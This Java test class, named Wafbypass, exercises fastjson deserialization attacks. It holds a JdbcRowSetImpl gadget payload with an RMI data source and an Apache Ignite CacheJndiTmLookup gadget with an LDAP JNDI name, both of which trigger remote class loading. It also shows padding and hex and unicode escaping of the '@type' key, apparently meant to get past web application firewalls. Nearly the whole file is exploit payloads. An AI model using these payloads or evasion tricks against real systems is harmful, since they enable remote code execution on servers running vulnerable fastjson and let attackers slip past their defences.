package org.example;

import com.alibaba.fastjson.JSON;
import org.junit.jupiter.api.Test;

public class Wafbypass {
    @Test
    public void addstr() {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/qls521\",\"autoCommit\":true,\"a\":\"a*20000\"}";
        payload = "{\"@type\":\"org.example.User\",\"username\":\"1\",\"f\":\"a*20000\"}";
        JSON.parse(payload);
    }

    @Test
    public void encode() {
        String hex = "{\"\\x40\\x74\\x79\\x70\\x65\":\"\\x6f\\x72\\x67\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65\\x2e\\x55\\x73\\x65\\x72\",\"username\":\"1\"}";
        String unicode = "{\"@type\":\"\\u006f\\u0072\\u0067\\u002e\\u0065\\u0078\\u0061\\u006d\\u0070\\u006c\\u0065\\u002e\\u0055\\u0073\\u0065\\u0072\",\"username\":\"1\"}";
        JSON.parse(unicode);
    }

    @Test
    public void igniteDemo() {
        String payload = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://192.168.16.132:1389/siflky\"], \"tm\": {\"$ref\":\"$.tm\"}}";
        Object jsonObject = JSON.parseObject(payload);
    }

}
